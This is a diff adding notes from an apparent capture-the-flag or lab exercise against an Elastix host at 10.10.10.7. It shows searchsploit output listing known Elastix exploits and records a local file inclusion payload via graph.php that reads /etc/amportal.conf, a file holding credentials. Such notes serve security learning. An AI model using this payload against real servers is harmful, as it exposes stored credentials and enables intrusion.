@@ -84,5 +84,46 @@ Canceled by the user
 .
 .
 .
+allenwest1@debian:~/Desktop$ searchsploit elastix
+[i] Found (#2): /opt/exploit-database/files_exploits.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+ Exploit Title                                                                                            |  Path
+                                                                                                          | (/opt/exploit-database/)
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+Elastix - 'page' Cross-Site Scripting                                                                     | exploits/php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                   | exploits/php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                             | exploits/php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                          | exploits/php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                         | exploits/php/webapps/36305.txt
+Elastix < 2.5 - PHP Code Injection                                                                        | exploits/php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                    | exploits/php/webapps/18650.py
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+Shellcodes: No Result
+allenwest1@debian:~/Desktop$ searchsploit -x exploits/php/webapps/37637.pl
+[i] Found (#2): /opt/exploit-database/files_exploits.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
+      URL: https://www.exploit-db.com/exploits/37637
+     Path: /opt/exploit-database/exploits/php/webapps/37637.pl
+File Type: ASCII text, with CRLF line terminators
+
+
+.
+.
+.
+// Important line in this exploit was: (whole file in foundExploit.pl)
+// #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+// pasted after http://10.10.10.7
+// got a jumbled page so pressed view page source
+// code from there can be found in pageSource.txt
 
 
